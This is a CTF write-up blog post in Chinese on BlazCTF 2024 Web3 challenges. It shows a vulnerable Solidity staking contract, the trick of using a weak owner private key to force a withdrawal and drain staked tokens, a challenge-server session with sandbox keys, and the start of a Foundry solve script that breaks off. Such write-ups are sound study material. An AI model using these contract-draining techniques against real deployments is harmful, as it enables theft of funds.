<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Ching367436,臺中一中電腦資訊研習社 38th 副社長,Bamboofox 社長,書卷獎,資安,AIS3 最佳專題">
    
    <meta name="author" content="Ching367436">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://blog.ching367436.me/blazctf-2024/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="BlazCTF 2024 是我第一場 Web3 CTF。這次是跟[竹狐](https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;280959)一起打（整隊只有我有碰過一點點 Web3 所以基本上是自己打）。題目品質整體算滿不錯的。">
<meta property="og:type" content="article">
<meta property="og:title" content="BlazCTF 2024">
<meta property="og:url" content="https://blog.ching367436.me/blazctf-2024/">
<meta property="og:site_name" content="Ching367436">
<meta property="og:description" content="BlazCTF 2024 是我第一場 Web3 CTF。這次是跟[竹狐](https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;280959)一起打（整隊只有我有碰過一點點 Web3 所以基本上是自己打）。題目品質整體算滿不錯的。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.ching367436.me/blazctf-2024/cover.webp">
<meta property="article:published_time" content="2024-09-23T06:21:49.000Z">
<meta property="article:author" content="Ching367436">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="blockchain">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.ching367436.me/blazctf-2024/cover.webp">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-PRRP5V9HFQ"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-PRRP5V9HFQ');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            BlazCTF 2024 -
        
        Ching367436&#39;s blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    
        
            
    
            
    
            
                
                    <meta http-equiv="Content-Security-Policy" content="
  default-src 'self' https://*.clarity.ms https://c.bing.com https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com https://cloudflareinsights.com ; 
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.clarity.ms https://c.bing.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://static.cloudflareinsights.com ; 
  style-src 'unsafe-inline' 'self' https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com; 
  img-src 'self' data: https://*.clarity.ms https://c.bing.com https://cdn.jsdelivr.net/ https://www.googletagmanager.com ;
" />

                
    
            
                
                    <script data-swup-reload-script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "gh62bmw6cl"); </script>
                
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap" rel="stylesheet">
    
    
        <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap" rel="stylesheet">
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"blog.ching367436.me","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"18px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["竹狐隊長"]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"github-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":false,"recommendation":{"enable":true,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans TC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap"},"english":{"enable":true,"family":"Lexend","url":"https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":true,"id":"G-PRRP5V9HFQ"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Ching367436's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ching367436","instagram":null,"zhihu":null,"twitter":"https://twitter.com/Ching367436","email":"data:text/plain;base64,YWRtaW5bYXRdY2hpbmczNjc0MzYubWU=","telegram":"https://t.me/Ching367436"},"qrs":[]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"none","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/3/20 21:33:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style><link rel="alternate" href="/atom.xml" title="Ching367436" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">

    <div class="navbar-content ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Ching367436&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    TAGS
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/about"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    ABOUT
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                TAGS
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/about"
                        >
                            <span>
                                ABOUT
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/blazctf-2024/cover.webp" alt="BlazCTF 2024" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">BlazCTF 2024</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/Ching367436.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Ching367436</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">竹狐隊長</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-09-23 14:21:49</span>
        <span class="mobile">2024-09-23 14:21:49</span>
        <span class="hover-info">Created</span>
    </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/ctf/">ctf</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/blockchain/">blockchain</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>21 Mins</span>
        </span>
    
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <p><a class="link" target="_blank" rel="noopener" href="https://ctftime.org/event/2492/">BlazCTF 2024 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是我第一場 Web3 CTF，做個以後可以回來複製貼上的紀錄。這次是跟<a class="link" target="_blank" rel="noopener" href="https://ctftime.org/team/280959">竹狐 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>一起打（整隊只有我有碰過一點點 Web3 所以基本上是自己打），比賽時間剛好撞到修的網路安全實務與社會密集課程 QQ。題目品質整體算滿不錯的。官方的題目在 <a class="link" target="_blank" rel="noopener" href="https://github.com/fuzzland/blazctf-2024/tree/main%E3%80%82">https://github.com/fuzzland/blazctf-2024/tree/main。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Ciao"><a href="#Ciao" class="headerlink" title="Ciao"></a>Ciao</h3><p>Welcome 題，給了一個 <a class="link" target="_blank" rel="noopener" href="https://app.sentio.xyz/tx/42161/0xd58271ed821a19fa5af95245e2be55782cad67f46556aa437e1af157267ce6d4?nav=s">transaction <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，然後 flag 在 transaction 的一個 calldata 裡面。把他丟進 <a class="link" target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=From_Hex('None')From_Hex('Auto')&input=MzI2NTMyMzkzMDM5NjQzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMjMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMzNjQzNjM3MzY2NDMyMzEzMjMwMzUzNDM2MzgzNjM1MzIzMDM2MzYzNjYzMzYzMTM2MzczMjMwMzYzOTM3MzMzMjMwMzYzMjM2NjMzNjMxMzc2MTM3NjIzNTM3MzMzMzM2NjMzNjMzMzMzMDM2NjQzNjM1MzU2NjM1MzQzMzMwMzU2NjM1MzQzNjM4MzMzMzM1NjYzNzMwMzMzNDM3MzIzNzM0MzczOTM1NjYzNDY1MzMzMDM3MzczNTY2MzQzNzMzMzAzMzMwMzYzNDM1NjYzNDYzMzczNTM2MzMzNjYyMzU2NjM2NjQzNDM2MzMzMzM1MzIzNzY0MzAzMDMwMzAzMDMw">CipherChef <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 裡面就有 flag 了。</p>
<p><img src="/blazctf-2024/ciao.webp" alt="ciao"></p>
<h3 id="BigenLayer"><a href="#BigenLayer" class="headerlink" title="BigenLayer"></a>BigenLayer</h3><h4 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import {ERC20} from "./ERC20.sol";</span><br><span class="line"></span><br><span class="line">contract iPhone16 is ERC20 {</span><br><span class="line">    // [...]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract BigenLayer {</span><br><span class="line">    address public immutable owner;</span><br><span class="line">    iPhone16 public immutable token;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public stakedBalance;</span><br><span class="line">    mapping(address =&gt; uint256) public withdrawalRequestTime;</span><br><span class="line">    mapping(address =&gt; uint256) public pendingWithdrawals;</span><br><span class="line">    mapping(address =&gt; address) public withdrawalRecipient;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner, iPhone16 _token) {</span><br><span class="line">        owner = _owner;</span><br><span class="line">        token = _token;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function stake(address onBehalf, uint256 amount) external {</span><br><span class="line">        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");</span><br><span class="line">        stakedBalance[onBehalf] += amount;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _requestWithdrawal(address user, uint256 amount, address recipient) internal {</span><br><span class="line">        require(stakedBalance[user] &gt;= amount, "Insufficient balance");</span><br><span class="line">        stakedBalance[user] -= amount;</span><br><span class="line">        pendingWithdrawals[user] += amount;</span><br><span class="line">        withdrawalRequestTime[user] = block.timestamp;</span><br><span class="line">        withdrawalRecipient[user] = recipient;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function requestWithdrawal(uint256 amount, address recipient) external {</span><br><span class="line">        _requestWithdrawal(msg.sender, amount, recipient);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function adminRequestWithdrawal(address user, uint256 amount, address recipient) external {</span><br><span class="line">        require(msg.sender == owner, "Only owner can call this function");</span><br><span class="line">        _requestWithdrawal(user, amount, recipient);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function finalizeWithdrawal(address user) external {</span><br><span class="line">        uint256 amount = pendingWithdrawals[user];</span><br><span class="line">        require(amount &gt; 0, "No pending withdrawal");</span><br><span class="line">        require(block.timestamp &gt;= withdrawalRequestTime[user] + 12 seconds, "Withdrawal too early");</span><br><span class="line">        address recipient = withdrawalRecipient[user];</span><br><span class="line">        pendingWithdrawals[user] = 0;</span><br><span class="line">        require(token.transfer(recipient, amount), "Transfer failed");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Challenge {</span><br><span class="line">    address public immutable PLAYER;</span><br><span class="line">    BigenLayer public immutable bigen;</span><br><span class="line">    iPhone16 public immutable token;</span><br><span class="line"></span><br><span class="line">    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;</span><br><span class="line">    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;</span><br><span class="line"></span><br><span class="line">    constructor(address player) {</span><br><span class="line">        PLAYER = player;</span><br><span class="line">        token = new iPhone16();</span><br><span class="line">        bigen = new BigenLayer(OWNER, token);</span><br><span class="line"></span><br><span class="line">        token.approve(address(bigen), type(uint256).max);</span><br><span class="line">        bigen.stake(TIM_COOK, 16 * 10 ** 18);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) {</span><br><span class="line">        return token.balanceOf(PLAYER) &gt;= 16 * 10 ** 18;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<h4 id="題解"><a href="#題解" class="headerlink" title="題解"></a>題解</h4><p><code>BigenLayer.OWNER</code> 的 private key 是 <code>0x1337</code>，用 <code>OWNER</code> 權限來 <code>BigenLayer.adminRequestWithdrawal</code> 即可。</p>
<h4 id="解題環境細節"><a href="#解題環境細節" class="headerlink" title="解題環境細節"></a>解題環境細節</h4><h5 id="0-環境建置-Dev-Containers"><a href="#0-環境建置-Dev-Containers" class="headerlink" title="0. 環境建置 (Dev Containers)"></a>0. 環境建置 (<a class="link" target="_blank" rel="noopener" href="https://code.visualstudio.com/docs/devcontainers/tutorial">Dev Containers <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</h5><p>這邊會使用 <a class="link" target="_blank" rel="noopener" href="https://damnvulnerabledefi.xyz/">Damn Vulnerable DeFi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 所建置的 Dev container。在開始前需先安裝好 VSCode 跟 Docker。</p>
<p>接著到 <a class="link" target="_blank" rel="noopener" href="https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0">Damn Vulnerable DeFi 的 repository <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，裡面有個資料夾叫做 <a class="link" target="_blank" rel="noopener" href="https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/.devcontainer">.devcontainer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。把他整個載下來放到題目給的 Foundry project 資料夾裡。</p>
<img src="/blazctf-2024/devcontainer-folder.webp" alt="devcontainer-folder" style="width: 20em;">

<p>接著使用 VSCode 打開 .devcontainer 的上層資料夾。VSCode 會問要不要在 Container 裡打開，點選 Reopen in Container。接著我們就有一個在 Docker 裡面的 foundry 環境了 🎉</p>
<img src="/blazctf-2024/devcontainer-prompt.webp" alt="devcontainer-prompt" style="width: 42em;">

<p>接著記得將題目的環境變數設好。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc bigen-layer.chal.ctf.so 1337</span><br><span class="line">ticket? d7965f43-9211-4501-9594-9f13733ef833</span><br><span class="line">1 - launch new instance</span><br><span class="line">2 - <span class="built_in">kill</span> instance</span><br><span class="line">3 - get flag</span><br><span class="line">action? 1</span><br><span class="line">creating private blockchain...</span><br><span class="line">deploying challenge...</span><br><span class="line"></span><br><span class="line">your private blockchain has been <span class="built_in">set</span> up</span><br><span class="line">it will automatically terminate <span class="keyword">in</span> 1440 seconds</span><br><span class="line">---</span><br><span class="line">rpc endpoints:</span><br><span class="line">    - http://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main</span><br><span class="line">    - ws://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main/ws</span><br><span class="line">private key:        0x440b27e18d2945173d24fc364512cb627d80263fac79182704519fd77ee06735</span><br><span class="line">challenge contract: 0x93254FaE56400134F9b2592B156C9d0267950d97</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">export</span> RPC=http://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main</span><br><span class="line">&gt; <span class="built_in">export</span> PLAYER=0x440b27e18d2945173d24fc364512cb627d80263fac79182704519fd77ee06735</span><br><span class="line">&gt; <span class="built_in">export</span> CHALLENGE=0x93254FaE56400134F9b2592B156C9d0267950d97</span><br></pre></td></tr></table></figure></div>

<h5 id="1-給-OWNER-送一些-ethers，讓他能送-transaction"><a href="#1-給-OWNER-送一些-ethers，讓他能送-transaction" class="headerlink" title="1. 給 OWNER 送一些 ethers，讓他能送 transaction"></a>1. 給 <code>OWNER</code> 送一些 ethers，讓他能送 transaction</h5><h6 id="script-Solve-pre-pre-s-sol"><a href="#script-Solve-pre-pre-s-sol" class="headerlink" title="script/Solve_pre_pre.s.sol"></a>script/Solve_pre_pre.s.sol</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import "forge-ctf/CTFSolver.sol";</span><br><span class="line">import "forge-std/Script.sol";</span><br><span class="line">import "src/Challenge.sol";</span><br><span class="line"></span><br><span class="line">contract Solve is Script {</span><br><span class="line">    address public constant TIM_COOK = 